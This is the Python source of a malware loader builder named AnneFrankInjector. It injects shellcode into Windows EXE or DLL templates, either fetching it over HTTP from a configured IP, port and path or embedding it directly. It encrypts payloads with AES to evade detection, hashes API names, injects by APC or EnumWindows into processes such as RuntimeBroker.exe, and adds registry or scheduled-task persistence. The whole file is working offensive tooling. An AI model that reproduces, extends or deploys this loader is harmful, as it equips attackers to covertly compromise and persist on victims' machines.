#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import subprocess
import shutil
import errno

from importlib import resources
from core.hashing import Hasher
from argparse import ArgumentParser
from core.utils import Colors, banner
from core.encryption import Encryption


def main():
    parser = ArgumentParser(description="AnneFrankInjector", epilog="Author: Excalibra")
    subparsers = parser.add_subparsers(dest="commands", help="Staged or Stageless Payloads", required=True)

    # ---------- Staged ----------
    parser_staged = subparsers.add_parser("staged", help="Staged")
    parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
    parser_staged.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection.")
    parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address for HTTP fetch.", required=True)
    parser_staged.add_argument("-po", "--port", type=int, help="Port for HTTP fetch.", required=True)
    parser_staged.add_argument("-pa", "--path", type=str, help="Path for HTTP fetch.", required=True)
    parser_staged.add_argument("-o", "--output", type=str, help="Output filename (without extension). Default: afloader")
    parser_staged.add_argument("-e", "--encrypt", action="store_true", help="Encrypt shellcode via AES-128-CBC.")
    parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble function/variable names.")
    parser_staged.add_argument("--persistence", choices=["reg", "task"], help="Add persistence via registry or scheduled task.")
    parser_staged.add_argument("-pfx", "--pfx", type=str, help="Path to PFX file for signing.")
    parser_staged.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for PFX file.")
    parser_staged.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection.")
    parser_staged.add_argument("--spawn", action="store_true", help="Spawn a new process for injection.")
    parser_staged.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Process to spawn.")
    parser_staged.add_argument("--injection", choices=["apc", "enumwindows"], default="apc", help="Injection technique")
    parser_staged.add_argument("--staggered", action="store_true", help="Use two-stage registry persistence")
    parser_staged.epilog = "Example: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o myloader -e -s"

    # ---------- Stageless ----------
    parser_stageless = subparsers.add_parser("stageless", help="Stageless")
    parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
    parser_stageless.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection.")
    parser_stageless.add_argument("-o", "--output", type=str, help="Output filename (without extension). Default: afloader")
    parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt shellcode via AES-128-CBC.")
    parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble function/variable names.")
    parser_stageless.add_argument("--persistence", choices=["reg", "task"], help="Add persistence via registry or scheduled task.")
    parser_stageless.add_argument("-pfx", "--pfx", type=str, help="Path to PFX file for signing.")
    parser_stageless.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for PFX file.")
    parser_stageless.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection.")
    parser_stageless.add_argument("--spawn", action="store_true", help="Spawn a new process for injection.")
    parser_stageless.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Process to spawn.")
    parser_stageless.add_argument("--injection", choices=["apc", "enumwindows"], default="apc", help="Injection technique")
    parser_stageless.add_argument("--staggered", action="store_true", help="Use two-stage registry persistence")
    parser_stageless.epilog = "Example: python main.py stageless -p shellcode.bin -o myloader -e -s"

    args = parser.parse_args()
    banner()

    # ------------------------------------------------------------------
    # Staged Variant
    # ------------------------------------------------------------------
    if args.commands == "staged":
        print(Colors.green("[i] Staged Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

        cr_directory = os.path.dirname(os.path.abspath(__file__))
        src_directory = resources.files("templates").joinpath("staged")
        dst_directory = f'{cr_directory}/.afpacker'

        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        if args.payload and args.ip_address and args.port and args.path:
            # Replace IP/port/path in download.c
            ip = args.ip_address
            port = args.port
            path = args.path
            with open(f'{dst_directory}/download.c', 'r') as f:
                download_data = f.read()
            download_data = download_data.replace("#-IP_VALUE-#", ip)
            download_data = download_data.replace("#-PORT_VALUE-#", str(port))
            download_data = download_data.replace("#-PATH_VALUE-#", path)
            with open(f'{dst_directory}/download.c', 'w') as f:
                f.write(download_data)

            with open(args.payload, "rb") as f:
                payload = f.read()

            # Hashing
            INITIAL_SEED = random.randint(5, 20)
            INITIAL_HASH = random.randint(2000, 9000)
            NTDLL_HASH = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            # Replace hashes in all C/H files
            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}/{filename}", "r") as f:
                        data = f.read()
                    data = data.replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                    data = data.replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                    data = data.replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                    data = data.replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                    data = data.replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                    data = data.replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                    data = data.replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                    data = data.replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)
                    with open(f"{dst_directory}/{filename}", "w") as f:
                        f.write(data)

            print(Colors.green("[+] Template files modified!"))

            # Spawn injection (add macro to all C/H files)
            if args.spawn:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        content = content.replace("//#-SPAWN-#", "#define USE_SPAWN")
                        if args.spawn_path:
                            spawn_path_escaped = args.spawn_path.replace("\\", "\\\\")
                            content = content.replace("//#-SPAWN_PATH-#", f'#define SPAWN_PATH "{spawn_path_escaped}"')
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Spawn injection mode enabled."))

            # Injection technique selection (add macro to all C/H files)
            if args.injection == "enumwindows":
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        content = content.replace("//#-INJECTION-#", "#define USE_ENUMWINDOWS")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Using EnumWindows injection"))

            # APC target (only in main.c/main_dll.c)
            print(Colors.light_yellow("[+] Setting APC injection target process..."))
            main_c_path = os.path.join(dst_directory, "main.c")
            if args.format == "EXE":
                with open(main_c_path, "r") as f:
                    main_data = f.read()
                main_data = main_data.replace("#-TARGET_PROCESS-#", args.apc)
                with open(main_c_path, "w") as f:
                    f.write(main_data)
            elif args.format == "DLL":
                dll_path = os.path.join(dst_directory, "main_dll.c")
                with open(dll_path, "r") as f:
                    main_data = f.read()
                main_data = main_data.replace("#-TARGET_PROCESS-#", args.apc)
                with open(dll_path, "w") as f:
                    f.write(main_data)

            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))

            # Delay (replace Sleep with high_cpu_wait in ALL .c files)
            if args.delay > 0:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c"):
                        path_c = os.path.join(dst_directory, filename)
                        with open(path_c, "r") as f:
                            content = f.read()
                        content = content.replace("Sleep(", "high_cpu_wait(")
                        with open(path_c, "w") as f:
                            f.write(content)
                print(Colors.green(f"[+] Added delay of {args.delay} seconds (using high_cpu_wait)."))

            # Encryption
            if args.encrypt:
                print(Colors.green("[i] Encryption selected."))
                enc_payload, key, iv = Encryption.EncryptAES(payload)
                if args.output and os.path.exists(f"{args.output}.bin"):
                    os.remove(f"{args.output}.bin")
                out_bin = f"{args.output}.bin" if args.output else "afloader.bin"
                with open(out_bin, "wb") as f:
                    f.write(enc_payload)
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            main_data = f.read()
                        main_data = main_data.replace("#-KEY_VALUE-#", key)
                        main_data = main_data.replace("#-IV_VALUE-#", iv)
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(main_data)
                print(Colors.green(f"[+] Payload encrypted and saved to {out_bin}"))
            else:
                print(Colors.green("[i] Encryption not selected."))
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            main_data = f.read()
                        main_data = main_data.replace('#include "AES_128_CBC.h"', '//#include "AES_128_CBC.h"')
                        main_data = main_data.replace("AES_DecryptInit", "//AES_DecryptInit")
                        main_data = main_data.replace("AES_DecryptBuffer", "//AES_DecryptBuffer")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(main_data)
                shutil.copy(args.payload, f"{args.output}.bin" if args.output else "afloader.bin")

            # Scrambling (if you have code, keep it; this is a placeholder)
            if args.scramble:
                print(Colors.green("[i] Scrambling selected."))
                # Insert your full scrambling code here if needed
                print(Colors.green("[+] Loader scrambled!"))

            # Persistence and staggered
            if args.persistence or args.staggered:
                # Regular persistence
                if args.persistence:
                    persistence_file = f"persistence_{args.persistence}.c"
                    src_persistence = os.path.join(cr_directory, "templates", "staged", persistence_file)
                    dst_persistence = os.path.join(dst_directory, persistence_file)
                    if os.path.isfile(src_persistence):
                        shutil.copy(src_persistence, dst_persistence)
                        main_c_path = os.path.join(dst_directory, "main.c")
                        if args.format == "DLL":
                            main_c_path = os.path.join(dst_directory, "main_dll.c")
                        with open(main_c_path, "r") as f:
                            main_content = f.read()
                        main_content = main_content.replace(
                            '#include "unhook.c"',
                            f'#include "unhook.c"\n#include "{persistence_file}"'
                        )
                        if "// Injection completed" in main_content:
                            main_content = main_content.replace(
                                "// Injection completed",
                                f"// Injection completed\n    add_persistence_{args.persistence}();"
                            )
                        else:
                            main_content = main_content.replace(
                                "return 0;",
                                f"    add_persistence_{args.persistence}();\n    return 0;"
                            )
                        with open(main_c_path, "w") as f:
                            f.write(main_content)
                        print(Colors.green(f"[+] Added {args.persistence} persistence."))
                    else:
                        print(Colors.red(f"[!] Persistence file not found: {src_persistence}"))

                # Staggered (two-stage) persistence
                if args.staggered:
                    staggered_src = os.path.join(cr_directory, "templates", "staged", "staggered_reg.c")
                    staggered_dst = os.path.join(dst_directory, "staggered_reg.c")
                    if os.path.isfile(staggered_src):
                        shutil.copy(staggered_src, staggered_dst)
                        main_c_path = os.path.join(dst_directory, "main.c")
                        if args.format == "DLL":
                            main_c_path = os.path.join(dst_directory, "main_dll.c")
                        with open(main_c_path, "r") as f:
                            content = f.read()
                        content = content.replace("//#-STAGGERED-#", "#define STAGGERED_PERSISTENCE")
                        with open(main_c_path, "w") as f:
                            f.write(content)
                        print(Colors.green("[+] Two-stage persistence enabled"))
                    else:
                        print(Colors.red(f"[!] staggered_reg.c not found: {staggered_src}"))

            # Compilation
            output_name = args.output if args.output else "afloader"
            if args.format == "EXE":
                if args.pfx:
                    # Signing (placeholder)
                    pass
                else:
                    os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")
                    shutil.move(f"{dst_directory}/afloader.exe", f"{output_name}.exe")
                    shutil.rmtree(dst_directory)
                    print(Colors.green("[+] Loader compiled!"))
            elif args.format == "DLL":
                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=DLL")
                shutil.move(f"{dst_directory}/afloader.dll", f"{output_name}.dll")
                shutil.rmtree(dst_directory)
                print(Colors.green("[+] Loader compiled!"))

            print(Colors.green("[+] DONE!"))

    # ------------------------------------------------------------------
    # Stageless Variant (identical changes)
    # ------------------------------------------------------------------
    if args.commands == "stageless":
        print(Colors.green("[i] Stageless Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

        cr_directory = os.path.dirname(os.path.abspath(__file__))
        src_directory = resources.files("templates").joinpath("stageless")
        dst_directory = f'{cr_directory}/.afpacker'

        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        if args.payload:
            with open(args.payload, "rb") as f:
                raw_payload = f.read()
            payload_hex = ', '.join(f"0x{b:02x}" for b in raw_payload)

            # Hashing
            INITIAL_SEED = random.randint(5, 20)
            INITIAL_HASH = random.randint(2000, 9000)
            NTDLL_HASH = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}/{filename}", "r") as f:
                        data = f.read()
                    data = data.replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                    data = data.replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                    data = data.replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                    data = data.replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                    data = data.replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                    data = data.replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                    data = data.replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                    data = data.replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)
                    with open(f"{dst_directory}/{filename}", "w") as f:
                        f.write(data)

            print(Colors.green("[+] Template files modified!"))

            # Spawn injection (add macro to all C/H files)
            if args.spawn:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        content = content.replace("//#-SPAWN-#", "#define USE_SPAWN")
                        if args.spawn_path:
                            spawn_path_escaped = args.spawn_path.replace("\\", "\\\\")
                            content = content.replace("//#-SPAWN_PATH-#", f'#define SPAWN_PATH "{spawn_path_escaped}"')
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Spawn injection mode enabled."))

            # Injection technique selection (add macro to all C/H files)
            if args.injection == "enumwindows":
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        content = content.replace("//#-INJECTION-#", "#define USE_ENUMWINDOWS")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Using EnumWindows injection"))

            # APC target (only in main.c/main_dll.c)
            print(Colors.light_yellow("[+] Setting APC injection target process..."))
            main_c_path = os.path.join(dst_directory, "main.c")
            if args.format == "EXE":
                with open(main_c_path, "r") as f:
                    main_data = f.read()
                main_data = main_data.replace("#-TARGET_PROCESS-#", args.apc)
                with open(main_c_path, "w") as f:
                    f.write(main_data)
            elif args.format == "DLL":
                dll_path = os.path.join(dst_directory, "main_dll.c")
                with open(dll_path, "r") as f:
                    main_data = f.read()
                main_data = main_data.replace("#-TARGET_PROCESS-#", args.apc)
                with open(dll_path, "w") as f:
                    f.write(main_data)

            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))

            # Delay (replace Sleep with high_cpu_wait in ALL .c files)
            if args.delay > 0:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c"):
                        path_c = os.path.join(dst_directory, filename)
                        with open(path_c, "r") as f:
                            content = f.read()
                        content = content.replace("Sleep(", "high_cpu_wait(")
                        with open(path_c, "w") as f:
                            f.write(content)
                print(Colors.green(f"[+] Added delay of {args.delay} seconds (using high_cpu_wait)."))

            # Encryption
            if args.encrypt:
                print(Colors.green("[i] Encryption selected."))
                enc_payload, key, iv = Encryption.EncryptAES(raw_payload)
                hex_payload = ', '.join(f"0x{b:02x}" for b in enc_payload)
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            main_data = f.read()
                        main_data = main_data.replace("#-KEY_VALUE-#", key)
                        main_data = main_data.replace("#-IV_VALUE-#", iv)
                        main_data = main_data.replace("#-PAYLOAD_VALUE-#", hex_payload)
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(main_data)
                print(Colors.green("[+] Payload encrypted and embedded."))
            else:
                print(Colors.green("[i] Encryption not selected."))
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            main_data = f.read()
                        main_data = main_data.replace("#-PAYLOAD_VALUE-#", payload_hex)
                        main_data = main_data.replace('#include "AES_128_CBC.h"', '//#include "AES_128_CBC.h"')
                        main_data = main_data.replace("AES_DecryptInit", "//AES_DecryptInit")
                        main_data = main_data.replace("AES_DecryptBuffer", "//AES_DecryptBuffer")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(main_data)

            # Scrambling (placeholder)
            if args.scramble:
                print(Colors.green("[i] Scrambling selected."))
                # Insert your full scrambling code here
                print(Colors.green("[+] Loader scrambled!"))

            # Persistence and staggered
            if args.persistence or args.staggered:
                # Regular persistence
                if args.persistence:
                    persistence_file = f"persistence_{args.persistence}.c"
                    src_persistence = os.path.join(cr_directory, "templates", "stageless", persistence_file)
                    dst_persistence = os.path.join(dst_directory, persistence_file)
                    if os.path.isfile(src_persistence):
                        shutil.copy(src_persistence, dst_persistence)
                        main_c_path = os.path.join(dst_directory, "main.c")
                        if args.format == "DLL":
                            main_c_path = os.path.join(dst_directory, "main_dll.c")
                        with open(main_c_path, "r") as f:
                            main_content = f.read()
                        main_content = main_content.replace(
                            '#include "unhook.c"',
                            f'#include "unhook.c"\n#include "{persistence_file}"'
                        )
                        if "// Injection completed" in main_content:
                            main_content = main_content.replace(
                                "// Injection completed",
                                f"// Injection completed\n    add_persistence_{args.persistence}();"
                            )
                        else:
                            main_content = main_content.replace(
                                "return 0;",
                                f"    add_persistence_{args.persistence}();\n    return 0;"
                            )
                        with open(main_c_path, "w") as f:
                            f.write(main_content)
                        print(Colors.green(f"[+] Added {args.persistence} persistence."))
                    else:
                        print(Colors.red(f"[!] Persistence file not found: {src_persistence}"))

                # Staggered (two-stage) persistence
                if args.staggered:
                    staggered_src = os.path.join(cr_directory, "templates", "stageless", "staggered_reg.c")
                    staggered_dst = os.path.join(dst_directory, "staggered_reg.c")
                    if os.path.isfile(staggered_src):
                        shutil.copy(staggered_src, staggered_dst)
                        main_c_path = os.path.join(dst_directory, "main.c")
                        if args.format == "DLL":
                            main_c_path = os.path.join(dst_directory, "main_dll.c")
                        with open(main_c_path, "r") as f:
                            content = f.read()
                        content = content.replace("//#-STAGGERED-#", "#define STAGGERED_PERSISTENCE")
                        with open(main_c_path, "w") as f:
                            f.write(content)
                        print(Colors.green("[+] Two-stage persistence enabled"))
                    else:
                        print(Colors.red(f"[!] staggered_reg.c not found: {staggered_src}"))

            # Compilation
            output_name = args.output if args.output else "afloader"
            if args.format == "EXE":
                if args.pfx:
                    pass
                else:
                    os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")
                    shutil.move(f"{dst_directory}/afloader.exe", f"{output_name}.exe")
                    shutil.rmtree(dst_directory)
                    print(Colors.green("[+] Loader compiled!"))
            elif args.format == "DLL":
                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=DLL")
                shutil.move(f"{dst_directory}/afloader.dll", f"{output_name}.dll")
                shutil.rmtree(dst_directory)
                print(Colors.green("[+] Loader compiled!"))

            print(Colors.green("[+] DONE!"))


if __name__ == "__main__":
    main()
